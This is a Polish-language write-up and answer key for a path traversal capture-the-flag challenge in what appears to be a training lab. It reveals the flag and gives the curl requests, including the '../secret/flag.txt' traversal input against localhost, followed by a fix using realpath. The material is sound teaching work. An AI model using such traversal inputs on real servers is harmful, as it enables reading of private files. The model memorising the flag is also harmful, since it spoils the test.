# A15 - Path Traversal

## Metadane
- **ID:** A15
- **Kategoria:** OWASP A01:2021
- **Trudnosc:** medium
- **Punkty:** 150
- **Flaga:** `PWR{p4th_tr4v3rs4l_s3cr3t_r34d}`

## Opis
Endpoint `/api/challenges/a15/report?name=` serwuje pliki
z katalogu /app/reports/. Brak sanityzacji sciezki pozwala
wyjsc poza katalog i odczytac dowolny plik na serwerze.

## Podatny endpoint
GET /api/challenges/a15/report?name=

## Exploit krok po kroku
### Krok 1: Wywolaj setup zeby utworzyc pliki:
`curl http://localhost:5000/api/challenges/a15/setup`

### Krok 2: Sprawdz ze normalny raport dziala:
`curl "http://localhost:5000/api/challenges/a15/report?name=q1_2024.txt"`

### Krok 3: Wyjdz poza katalog przez ../
`curl "http://localhost:5000/api/challenges/a15/report?name=../secret/flag.txt"`

### Krok 4: W polu content znajdziesz flage

## Jak to naprawic
Uzywac os.path.realpath() i sprawdzac czy sciezka zaczyna sie od REPORTS_DIR.

## Referencje
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html